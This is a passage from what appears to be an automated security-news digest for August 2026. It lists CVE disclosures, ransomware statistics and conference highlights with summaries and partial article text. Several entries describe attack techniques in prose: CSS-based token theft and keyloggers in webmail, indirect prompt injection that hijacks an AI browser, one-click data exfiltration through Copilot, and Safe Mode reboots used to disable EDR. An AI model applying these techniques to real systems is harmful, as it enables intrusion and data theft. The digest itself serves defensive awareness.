hold highly sensitive information, making them an attractive target. Data released by industry body Make UK published in August revealed that almost a third of UK manufacturers (30%) experienced a cyber incident over the past year, either directly or through their supply chain. Separate data from ESET published in April found that, of UK manufacturers that suffered a cyber incident last year, almost all (95%) admit the attack had a direct impact on their business, and most (53%) suffered financial loss as a result. Supply chain disruption (44%) and missed customer or supplier commitments (39%) were also commonplace. Black Kite’s analysis of security posture across over 120,000 mid-market firms revealed some of the deficiencies which could lead to ransomware compromise. Its findings include: Over a quarter (28%) had at least one known exploited vulnerability (KEV) Over half (55%) had at least one significant patch management finding on public-facing software Nearly half (48%) carried at least one disclosed vulnerability with a CVSS score of 8.0 or higher Nearly a third (32%) had at least one stealer log finding Nearly half (47%) had missing or insufficient DMARC protection The challenge for security teams in these organizations is set to increase as AI adoption grows, Black Kite argued. “AI is accelerating how fast new vulnerabilities are discovered, and the volume is climbing toward levels no small team can triage by hand,” the report claimed. “Only a fraction of those vulnerabilities are ever exploited, but finding that fraction across a company’s own systems and its suppliers is exactly the work a mid-market team has little capacity to do.” You may also like 80% of Manufacturing Firms Have Critical Vulnerabilities News 2 October 2024 Manufacturers Struggle to Manage Cyber-Threats from New Tech Deployments News 5 December 2022 Tech Manufacturer Data I/O H
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Three-quarters of Ransomware Attacks Target Mid-Market Firms
  - Published: 2026-08-18T10:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/threequarters-ransomware-attacks/
  - Summary: Black Kite finds mid-market is the sweet spot for ransomware as manufacturers are most likely to be hit

### Cluster 7029814c59 — score 9

- Title: CVE-2026-33696: From a Schema Name to RCE in n8n
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-08-16T13:33:02+00:00
- Link: https://www.reddit.com/r/netsec/comments/1vpx6ku/cve202633696_from_a_schema_name_to_rce_in_n8n/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-33696

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-33696
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- cve_ids: CVE-2026-33696
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/TradeGold6317 [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: CVE-2026-33696: From a Schema Name to RCE in n8n
  - Published: 2026-08-16T13:33:02+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vpx6ku/cve202633696_from_a_schema_name_to_rce_in_n8n/
  - Summary: submitted by /u/TradeGold6317 [link] [comments]

### Cluster b1da6aaade — score 9

- Title: From Unauthenticated API to Grid Risk: A Hybrid Inverter Vulnerability Explained
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-08-13T15:20:01+00:00
- Link: https://www.reddit.com/r/netsec/comments/1vndp8e/from_unauthenticated_api_to_grid_risk_a_hybrid/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
Auth Bypass. Commands over CAN Bus to internal components. Protection mechanisms disabled and configuration changes. Impact: damage connected devices, permanent DoS to the inverter itself, fines, and even risk to the lives of grid technicians. proprietary communication protocols and file formats. RX architecture reverse engineering. submitted by /u/_solid_snail [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: From Unauthenticated API to Grid Risk: A Hybrid Inverter Vulnerability Explained
  - Published: 2026-08-13T15:20:01+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vndp8e/from_unauthenticated_api_to_grid_risk_a_hybrid/
  - Summary: Auth Bypass. Commands over CAN Bus to internal components. Protection mechanisms disabled and configuration changes. Impact: damage connected devices, permanent DoS to the inverter itself, fines, and even risk to the lives of grid technicians. proprietary communication protocols and file formats. RX architecture reverse engineering. submitted by /u/_solid_snail [link] [comments]

### Cluster 155be52ad5 — score 9

- Title: CVE-2026-6837: Root Command Injection Affecting 18 Zyxel Access Point Models with full firmware emulation guide
- Source: Reddit r/cybersecurity (reddit_practitioner_osint)
- Published: 2026-08-18T12:35:01+00:00
- Link: https://www.reddit.com/r/cybersecurity/comments/1vrnwu3/cve20266837_root_command_injection_affecting_18/
- Fetch status: fetch_failed:HTTPError
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-6837

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-6837
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- cve_ids: CVE-2026-6837
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
I published my technical write-up for CVE-2026-6837, an authenticated command-injection issue in Zyxel’s certificate export functionality. The analysis is based on the WAX650S, while Zyxel’s advisory expanded the affected scope to 18 AP models. The post includes root cause, affected versions, remediation, and the reproduction environment. submitted by /u/TheReedemer69 [link] [comments]
```

#### Corroborating sources (2)

- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - Title: CVE-2026-6837: Root Command Injection Affecting 18 Zyxel Access Point Models with full firmware emulation guide
  - Published: 2026-08-18T12:35:01+00:00
  - Link: https://www.reddit.com/r/cybersecurity/comments/1vrnwu3/cve20266837_root_command_injection_affecting_18/
  - Summary: I published my technical write-up for CVE-2026-6837, an authenticated command-injection issue in Zyxel’s certificate export functionality. The analysis is based on the WAX650S, while Zyxel’s advisory expanded the affected scope to 18 AP models. The post includes root cause, affected versions, remediation, and the reproduction environment. submitted by /u/TheReedemer69 [link] [comments]
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: CVE-2026-6837: Command Injection in Zyxel export-cgi PKCS#12 Export Handling
  - Published: 2026-08-16T18:48:50+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vq55y4/cve20266837_command_injection_in_zyxel_exportcgi/
  - Summary: Technical analysis of CVE-2026-6837, an authenticated command-injection vulnerability in Zyxel’s PKCS#12 certificate export flow. The post covers the vulnerable execution path, root cause, affected firmware scope, and the firmware-emulation methodology used during analysis. submitted by /u/TheReedemer69 [link] [comments]

### Cluster b7b068c390 — score 9

- Title: [tl;dr sec] #341 - Hugging Face Incident Black Hat Talk, CSS Bomb in your Inbox, GitHub Supply Chain Security Improvements
- Source: tl;dr sec (practitioner_analysis)
- Published: 2026-08-13T14:30:00+00:00
- Link: https://tldrsec.com/p/tldr-sec-341
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, supply_chain
- affected_products: OpenAI/ChatGPT, WordPress
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: supply_chain, ai_security
- affected_products: WordPress, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
Deep dive and timeline of HF from OpenAI, Portswigger shows how CSS in webmail clients can be weaponized, GitHub's platform improvements
```

#### Full body

```
0 tl;dr sec Posts [tl;dr sec] #341 - Hugging Face Incident Black Hat Talk, CSS Bomb in your Inbox, GitHub Supply Chain Security Improvements [tl;dr sec] #341 - Hugging Face Incident Black Hat Talk, CSS Bomb in your Inbox, GitHub Supply Chain Security Improvements Deep dive and timeline of HF from OpenAI, Portswigger shows how CSS in webmail clients can be weaponized, GitHub's platform improvements Clint Gibler August 13, 2026 Hey there, I hope you’ve been doing well! 🤔 Where do I know you from? I think one of my favorite, most hilarious life moments in recent history occurred in Vegas during Black Hat. I was at the Specter Ops happy hour, catching up with my friend Matt Johansen, who runs the great Vulnerable U newsletter, and Bryan Solari, an NCC Group friend who now runs sales for most of the security creators, including tl;dr sec. One of my colleagues comes up and joins our circle, and starts chatting. Bryan says to him, “Hmm you look really familiar, where do I know you from? I think we met last RSA.” Colleague: “errr maybe?” Bryan: “Yeah, definitely RSA. Now what party was it… was it Island?” Matt and I make eye contact, how do we tell Bryan ? Me: “Bryan that’s… Greg.” Bryan: “No maybe it was a different party, was it…?” Me: “Greg… Brockman. The President and co-founder of OpenAI.” 😂 Bryan: “Oh OK. That’s cool.” They then proceed to talk about the security creator economy and Greg asked a bunch of questions. Delightful. P.S . My colleagues Eric Wallace and Michael Dalton ’s Black Hat USA 2026 deep dive into the timeline and details of The OpenAI-Hugging Face Incident is 🔥 >500K views in a week, whoa. Eric is a super nice and sharp dude, we’ve chatted a number of times about model training, and I was impressed by my interactions with Michael during the incident, very smart guy. Sponsor 📣 Burp AT: agentic AI that thinks like a pentester, with the tools of a pentester. A professional pentest takes more than a capable model. Burp AT brings agentic AI to human-led pentesting, natively inside Burp Suite. Agents pursue the tasks you give them using Burp’s battle-hardened tools, project context, and purpose-built skills developed with PortSwigger Research. You stay in control of scope, judgment, and conclusions. Burp enforces the boundaries you set and records the work, so you can reproduce findings and stand behind the evidence. 👉 Learn more about Burp AT 👈 PortSwigger Research is one of the best in web security in my opinion, hands down. Worth checking out what they’re building 👍️ AppSec CSS:the bomb inside your inbox The blog version of Portswigger’s Gareth Heyes ’ Black Hat talk ( GitHub repo ). Gareth demonstrates how CSS in webmail clients can be weaponized to bypass sanitizers, exfiltrate tokens, spoof UI, and steal passwords across Gmail, Outlook, Fastmail, ProtonMail, and others. Gareth combines techniques like nesting attribute selectors to brute-force Medium's 12-character hex tokens, indirect prompt injection to control OpenAI's Atlas browser, and font-height oracles with animations to exfiltrate numeric tokens when CSP blocks external resources, achieving account takeover from simple copy-paste actions into draft emails. He also walks through building real-time keyloggers using select elements. TIL about Shazzer , a shared online fuzzing platform for browser behavior testing, enabling security researchers to create, share, and run fuzz tests across different browsers to discover parsing quirks, JavaScript syntax variations, and potential security issues. 💡 Web chicanery of the highest order from the Portswigger team, as expected. Exploit brokers pay $500,000 for a WordPress RCE. I found one with GPT5.6 Sol Ultra and $25 SL Cyber’s (Assetnote) Adam Kues describes using GPT 5.6 Sol Ultra with an adapted version of OpenAI's Cycle Double Cover prompt to discover a pre-authentication RCE chain in WordPress core, spending approximately $25 and 10 hours of compute time. The exploit chains a batch API validation desync bug t
```

#### Corroborating sources (1)

- **tl;dr sec** (practitioner_analysis)
  - Title: [tl;dr sec] #341 - Hugging Face Incident Black Hat Talk, CSS Bomb in your Inbox, GitHub Supply Chain Security Improvements
  - Published: 2026-08-13T14:30:00+00:00
  - Link: https://tldrsec.com/p/tldr-sec-341
  - Summary: Deep dive and timeline of HF from OpenAI, Portswigger shows how CSS in webmail clients can be weaponized, GitHub's platform improvements

### Cluster aedb17e633 — score 9

- Title: Srsly Risky Biz: Data extortion is booming. Hooray!
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-08-13T09:40:16+00:00
- Link: https://risky.biz/SRB179/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Summary

```
Tom Uren and James Wilson talk about the cybercrime ecosystem shifting towards data theft extortion, stealing sensitive data and extracting ransoms from victims by threatening to leak it. For organisations whose reputation is very important to them, data leaks are a bigger threat than having their files locked up. They also discuss how the rise of AI makes it worth reinvigorating CISA’s Secure by Design initiative.
```

#### Full body

```
Risky Bulletin Podcast August 13, 2026 Srsly Risky Biz: Data extortion is booming. Hooray! Presented by James Wilson Technology Editor Tom Uren Policy & Intelligence Tom Uren and James Wilson talk about the cybercrime ecosystem shifting towards data theft extortion, stealing sensitive data and extracting ransoms from victims by threatening to leak it. For organisations whose reputation is very important to them, data leaks are a bigger threat than having their files locked up. They also discuss how the rise of AI makes it worth reinvigorating CISAâs Secure by Design initiative. Your browser does not support the audio element. Srsly Risky Biz: Data extortion is booming. Hooray! â¶ 0:00 / 30:48 Subscribe Brought to you by Island The Enterprise Browser
```

#### Corroborating sources (1)

- **Risky Business News** (practitioner_analysis)
  - Title: Srsly Risky Biz: Data extortion is booming. Hooray!
  - Published: 2026-08-13T09:40:16+00:00
  - Link: https://risky.biz/SRB179/
  - Summary: Tom Uren and James Wilson talk about the cybercrime ecosystem shifting towards data theft extortion, stealing sensitive data and extracting ransoms from victims by threatening to leak it. For organisations whose reputation is very important to them, data leaks are a bigger threat than having their files locked up. They also discuss how the rise of AI makes it worth reinvigorating CISA’s Secure by Design initiative.

### Cluster 4405003146 — score 9

- Title: From AKS node root vulnerability to Microsoft Copilot hijack (CVE-2026-32193)
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-08-17T12:17:40+00:00
- Link: https://www.reddit.com/r/netsec/comments/1vqqpwn/from_aks_node_root_vulnerability_to_microsoft/
- Fetch status: fetch_failed:HTTPError
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-32193, Microsoft/Copilot

#### Cluster taxonomy (union across members)
- affected_products: Microsoft/Copilot
- cve_ids: CVE-2026-32193
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_products: Microsoft/Copilot
- cve_ids: CVE-2026-32193
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/Master_Access_486 [link] [comments]
```

#### Corroborating sources (2)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: From AKS node root vulnerability to Microsoft Copilot hijack (CVE-2026-32193)
  - Published: 2026-08-17T12:17:40+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vqqpwn/from_aks_node_root_vulnerability_to_microsoft/
  - Summary: submitted by /u/Master_Access_486 [link] [comments]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Microsoft Copilot Personal Flaws Could Let One Click Exfiltrate Data From Connected Apps
  - Published: 2026-08-18T17:47:22+00:00
  - Link: https://thehackernews.com/2026/08/microsoft-copilot-personal-flaws-could.html
  - Summary: Varonis Threat Labs has disclosed three vulnerabilities in Microsoft Copilot Personal that it said could allow a single click on a crafted link to silently pull data from connected apps and other information available to the victim's Copilot session. The flaws, which the researchers collectively named CoSnitch, turn in part on an undocumented URL parameter that the assistant itself surfaced

### Cluster 228cd48aeb — score 8

- Title: AI Offense is Not Noclip Mode
- Source: TrustedSec (detection_response_operations)
- Published: 2026-08-13T04:00:00+00:00
- Link: https://trustedsec.com/blog/ai-offense-is-not-noclip-mode
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>AI doesn't let attackers walk through walls, but it makes finding the cracks more efficient. In this blog, we cut through the hype and explain what AI-driven offense really looks like and why hard controls still work.</p>
```

#### Full body

```
Blog AI Offense is Not Noclip Mode August 13, 2026 AI Offense is Not Noclip Mode Written by Justin Elze Artificial Intelligence (AI) Table of contents The Walls Are Real Reachability is the Variable Nobody Prices Why wp2shell Matters Ten Thousand Eyes Humans Are an Attack Surface Too AI Changes the Economics, Not the Requirements What Defenders Should Actually Do Persistence is Not a Skeleton Key References Everyone wants the cinematic version of offensive AI. The model finds a path nobody knew existed, ignores the controls, and lands on the objective using an attack class that did not previously exist. Noclip mode. Walk through the wall, skip the level. That framing is fun. It is also mostly wrong about the near-term risk. The practical advantage is more boring and more dangerous. AI makes it cheap to keep trying against attack paths we already understand. It can test more variations, explain why something failed, change approaches, connect findings across a codebase nobody has time to read end to end, and continue long after a human operator would have burned the engagement budget and moved on. That matters. It is also not magic, and the difference between those two statements is where most of the current commentary falls apart. The Walls Are Real Known attack paths generally have controls built around them. Conditional Access with device compliance and phishing-resistant authentication breaks a lot of credential abuse. WDAC or AppLocker in enforcement mode breaks a lot of execution. ASLR, DEP, CFG, CET, and the rest of the memory protection stack made entire exploit classes harder, less reliable, and more expensive. Segmentation limits movement. Tiered administration and LAPS limit what a foothold is worth. Rate limits, lockouts, logging, and behavioral detection still work at machine speed. A model does not reason its way past those controls because it tried hard enough. A blocked process is still blocked. A token that does not satisfy Conditional Access is still rejected. A memory corruption bug still has to survive whatever mitigations are compiled into the target. A host that cannot route to another segment does not acquire a route because someone wrote a better prompt. The problem is that almost nobody has one clean wall—a single, consistently enforced defensive boundary where the same controls apply everywhere. Instead, they have fifteen years of overlapping products, exceptions, legacy workflows, trusted paths, exclusions, stale systems, half-finished deployments, and controls enforced in one OU and left in audit mode in another. The result not exactly a wall, but a patchwork of defenses with gaps, seams, and inconsistent enforcement that attackers can work around. As I wrote in The Defensive Stack Is Exposed , the decision logic inside defensive products is increasingly part of the attack surface. Rules, thresholds, exclusions, trusted paths, and management states can now be studied together instead of one at a time. AI makes finding those seams cheaper. It can test every door, window, vent, service entrance, and badly patched section of drywall, compare versions, watch how the defensive product behaves, recover from dead ends, and keep refining until it finds the place where two controls do not quite overlap. Reachability is the Variable Nobody Prices There is another part of this conversation that keeps getting skipped: The attacker has to be able to reach the vulnerable surface. This is straightforward when the target is an unauthenticated Internet-facing application. Scan for it, send requests, and iterate without compromising anything first. Once the vulnerable component sits behind authentication, on an internal VLAN, inside a specific workflow, or behind a configuration almost nobody runs, the economics change. Now the attacker needs credentials, a foothold, routing, a particular role, a specific dependency version, or an earlier bug just to get within arm’s reach of the interesting code. That does not make t
```

#### Corroborating sources (1)

- **TrustedSec** (detection_response_operations)
  - Title: AI Offense is Not Noclip Mode
  - Published: 2026-08-13T04:00:00+00:00
  - Link: https://trustedsec.com/blog/ai-offense-is-not-noclip-mode
  - Summary: <p>AI doesn't let attackers walk through walls, but it makes finding the cracks more efficient. In this blog, we cut through the hype and explain what AI-driven offense really looks like and why hard controls still work.</p>

### Cluster 3ec665ac60 — score 8

- Title: 2608-patch-tuesday
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-08-17T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/2608-patch-tuesday
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>423 CVEs, no Edge patches, and a small shift in CWE findings</p> Categories: Threat Research Tags: Patch Tuesday, MICROSOFT PATCH TUESDAY
```

#### Full body

```
A heap of overflow in August’s Patch Tuesday haul 423 CVEs, no Edge patches, and a small shift in CWE findings Written by Angela Gunn Threat Research Patch Tuesday MICROSOFT PATCH TUESDAY Share This Link Copied
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: 2608-patch-tuesday
  - Published: 2026-08-17T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/2608-patch-tuesday
  - Summary: <p>423 CVEs, no Edge patches, and a small shift in CWE findings</p> Categories: Threat Research Tags: Patch Tuesday, MICROSOFT PATCH TUESDAY

### Cluster ed4882ad78 — score 8

- Title: 10 Hacker Summer Camp Standouts at Black Hat and DEF CON
- Source: Huntress (detection_response_operations)
- Published: 2026-08-14T04:00:00+00:00
- Link: https://www.huntress.com/blog/black-hat-def-con-standouts
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
From the panels to the villages, Huntress researchers and SOC analysts were all over Hacker Summer Camp this year. Here’s what stood out at Black Hat and DEF CON.
```

#### Full body

```
Home Blog From Black Hat to DEF CON: 10 Hacker Summer Camp Standouts Published: August 14, 2026 From Black Hat to DEF CON: 10 Hacker Summer Camp Standouts By: Lindsey O'Donnell-Welch Bryson Byrd Natalie Suarez Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Another year, another epic Hacker Summer Camp session. There were stickers galore. There was LineCon. Cliff Stoll took over a threat hunting panel . People decried John Hammond 's absence. All in all, a solid week. Behind it all, Huntress researchers were everywhere, and not just at our Black Hat booth: giving DEF CON talks, lending support to all the villages (Malware, Blue Team, Red Team, and more), and participating in the HacktheBox SOC Showdown. Here are 10 highlights from Hacker Summer Camp this year that we loved. 1. CloudBasher unleashed At DEF CON , Principal Security Researchers Jenko Hwong and Chris Ryan detailed their research into CloudShell, a browser-based terminal that major cloud providers offer so users can manage their cloud resources without installing anything locally. The research involved reverse-engineering the private REST and websocket protocols behind AWS, Azure, and GCP CloudShell terminals, along with analyzing browser authentication flows connecting cookies to OAuth tokens. The investigation unearthed significant Identity and Access Management (IAM) design weaknesses, including websocket sessions that outlive API token revocation and default CloudShell access tied to consumer email accounts. This all culminated in CloudBasher, a newly released toolkit that automates environment discovery, enumeration, and deployment of distributed workloads with persistent storage and private networking. Jenko and Chris demonstrated CloudBash live during the session across a resilient, large-scale agent network Jenko Hwong and Chris Ryan crack open CloudShell 2. All the villages DEF CON has almost 40 villages. These community initiatives are focused on tradecraft, offensive security, adversary simulation, emulation, and more across a number of different spaces–whether that's bug bounty, cryptocurrency, lockpicking, IoT, physical security, scambait, car hacking or biohacking. You could find us at the Malware Village, where Andrew Brandt , principal threat intelligence incident commander, and Austin Worline, security operations analyst, were helping out. Austin Worline fixes badges at Malware Village We were also leading the charge at the Red Team Village (where Logan MacLaren, staff offensive security engineer, was leading the command and conquer workshop ), and Blue Team Village (where Christina Parry, staff software engineer, led "The Modern Detection Engineer" panel). Christina Parry speaks during "The Modern Detection Engineer" panel 3. AI everywhere, and an industry deciding what it all means Unless you've been living under a rock, you knew AI would be all over Hacker Summer Camp. What stood out this year was less the volume and more the maturity of the conversation. On the Black Hat floor, every vendor claimed to be "agentic," but almost nobody defined it. Autonomous SOC analysts? LLMs with tool access? A chatbot with a scheduler? It felt like the EDR vs XDR debates all over again, the kind of terminology fight that always happens right before a market sorts itself out. Over at DEF CON, the conversation went a layer deeper. AI safety and policy discussions pulled real crowds, from Policy Village panels with people at frontier AI labs to hallway debates about model guardrails and platform abuse. The question we kept hearing was changing from "can we hack it" to "who owns the problem when it goes wrong." That shift matters, because AI is getting wired into security tooling and attacker tooling at the same time. There is real innovation under the buzzwords, and DEF CON remains one of the only places where the builders, the breakers, and the policymakers all end up in the same room to sort out which is which. 4. Threat actor trial abuse lessons
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: 10 Hacker Summer Camp Standouts at Black Hat and DEF CON
  - Published: 2026-08-14T04:00:00+00:00
  - Link: https://www.huntress.com/blog/black-hat-def-con-standouts
  - Summary: From the panels to the villages, Huntress researchers and SOC analysts were all over Hacker Summer Camp this year. Here’s what stood out at Black Hat and DEF CON.

### Cluster 03f13c7bab — score 8

- Title: Education Under Attack: The Pattern Behind Recent University Breaches
- Source: Huntress (detection_response_operations)
- Published: 2026-08-13T15:00:00+00:00
- Link: https://www.huntress.com/blog/why-is-education-under-attack
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- actor_attribution: ShinyHunters
- affected_industries: education, government
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- actor_attribution: ShinyHunters
- affected_industries: government, education
- affected_products: OpenAI/ChatGPT, Anthropic/Claude
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Four university breaches, one root cause: misconfiguration. See the pattern behind 2026's higher ed cyberattacks and how to fix the gap.
```

#### Full body

```
Home Blog The Pattern Behind 2026's University Breaches Published: August 13, 2026 The Pattern Behind 2026's University Breaches By: Team Huntress Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Every few weeks this year, a headline lands that reads almost the same way: a university confirms a data breach, a criminal group claims a leak site listing, and administrators say there's no evidence of broader compromise. Each incident gets reported as its own isolated story, then the news cycle moves on, and it happens again somewhere else. But they're not isolated. If you look closely at 2026's higher ed breach disclosures, you see a pattern emerge. It's the same story, told four or five times, just with different characters. The pattern: it's rarely a sophisticated attack In August, Newcastle University confirmed that a misconfiguration tied to its admissions system exposed contact information for roughly 440,000 people. The university traced the exposure back to a single connection setting. Two months earlier, the University of Western Australia found that an administrator had left system access credentials for Callista, its student information system, exposed online. Just a credential that shouldn't have been reachable, sitting in the open until someone found it. Around the same time, Avans University of Applied Sciences in the Netherlands discovered a Power BI misconfiguration had quietly exposed personal data to unauthorized viewers for nearly a year before anyone noticed. And earlier this year, Instructure's Canvas platform, used by roughly 9,000 schools, was breached by the extortion group ShinyHunters . The group claimed 275 million records and later defaced Canvas login portals at hundreds of institutions, timed to land during finals week. 90 days after that, the same group exploited an unpatched remote-code-execution flaw in Oracle PeopleSoft , reaching more than 300 instances at over 100 organizations, most of them universities. Different platforms, different countries, same throughline: an opening sat exposed until an attacker found it and used it. Why this keeps happening to universities specifically It's tempting to chalk this up to bad luck, or to assume higher ed is just a bigger target than other sectors. Neither are the issue here. What actually distinguishes higher education is structural. A university runs an enormous digital estate—admissions platforms, student information systems, research infrastructure, alumni and donor databases, learning management systems, and dozens of departmental tools procured independently—and that estate is governed in a decentralized way almost by design. Individual departments, colleges, and administrative offices often manage their own systems and vendor relationships, each with its own security standards, its own IT staffing, and its own blind spots. That's exactly what produces configuration gaps : nobody owns the full picture, so nobody notices when one piece of it opens up. And here's the uncomfortable part of this pattern: these are hygiene gaps. None of them require advanced attacker skill. A misconfigured system connection should get caught before it ships, not after a criminal group posts a sample to a leak site. Students, applicants, and alumni have no way to check whether the admissions vendor connection or the third-party dashboard pulling their data is configured correctly. They're trusting the institution to get the basics right, and that trust runs into a hard reality: lean IT and security teams, already stretched across identity, endpoints, and everyday support, often don't have the staffing to keep up with every connected system. At Black Hat, Jen Easterly talked to Caitlin Sarian (aka Cybersecurity Girl) about this very issue. Watch their conversation on why education tech vendors need to own more of the security burden and how schools should operate in a fragile digital world. Why this matters Attackers are opportunistic. They don't need to pick
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Education Under Attack: The Pattern Behind Recent University Breaches
  - Published: 2026-08-13T15:00:00+00:00
  - Link: https://www.huntress.com/blog/why-is-education-under-attack
  - Summary: Four university breaches, one root cause: misconfiguration. See the pattern behind 2026's higher ed cyberattacks and how to fix the gap.

### Cluster eb60a4b1a5 — score 8

- Title: Akira Hits Safe Mode: Ransomware Rebooting Around EDR
- Source: Huntress (detection_response_operations)
- Published: 2026-08-12T13:00:00+00:00
- Link: https://www.huntress.com/blog/akira-hits-safe-mode-ransomware-rebooting-around-edr
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_products: Microsoft Defender, OpenAI/ChatGPT, SonicWall
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_products: SonicWall, OpenAI/ChatGPT, Microsoft Defender
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
An Akira affiliate rebooted into Safe Mode to kill EDR and Defender, then Safe Mode broke their own ransomware. Here’s the full attack chain.
```

#### Full body

```
Home Blog Akira Hits Safe Mode: Ransomware Rebooting Around EDR Published: August 12, 2026 Akira Hits Safe Mode: Ransomware Rebooting Around EDR By: James Northey Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways After gaining access via an exposed SonicWall VPN, an Akira affiliate rebooted the victim host into Safe Mode with Networking to defeat EDR, a first for this ransomware variant in our telemetry. Safe Mode is a boot mode that only loads essential drivers and services, disabling most third-party software. As such, the reboot stopped the Huntress agent and disabled Microsoft Defender's real-time protection; Defender couldn't quarantine the file until the attacker rebooted back to normal mode. Ransomware families like Snatch and AvosLocker have abused Safe Mode for years, but this is the first reported tie to Akira that Huntress has observed. In this incident, Safe Mode also broke the ransomware. In its stripped-down memory environment, the Akira process tree hit an out-of-virtual-memory failure seconds after launching. While the anti-EDR effort backfired and the ransomware did not deploy, the attacker had already exfiltrated credentials and file shares. Even without encrypting anything, they can still extort the victim by threatening to leak the stolen information. Acknowledgments : Special thanks to Dray Agha for his help in analysing this attack. Akira has become one of the most prolific ransomware operations and was the most active group we observed in 2025 . Its affiliates have settled into a well-worn playbook: get in through an exposed VPN (usually SonicWall), pivot to the domain controller, enumerate Active Directory, stage and exfiltrate data, then detonate all within a few hours. Huntress has documented that playbook in depth: from the active exploitation of SonicWall SSL VPN appliances as an initial-access vector, to a recent case where an affiliate spun up a brand-new virtual machine on the victim's hypervisor specifically to run the encryptor somewhere Huntress wasn't installed. An incident we observed in early August followed that familiar chain almost beat for beat: the same SonicWall SSL VPN entry, the same AdUsers.txt/AdComp.txt Active Directory dumps opened in Notepad, the same WinRAR-then-cloud-upload exfil, but with one twist we hadn't seen from Akira before. Instead of dodging EDR by building a clean VM, the threat actor rebooted the compromised host into Safe Mode with Networking enabled—a diagnostic startup mode that loads only core Windows drivers and services while still permitting network connectivity. Because third-party security products are excluded from that minimal driver set by design, the reboot took both the Huntress agent and Windows Defender real-time protection offline in a single move, all while preserving the network access needed to continue the attack. What follows is the full attack chain, the Safe Mode play at its centre, and the detection and response lessons, including the part where the attacker's own 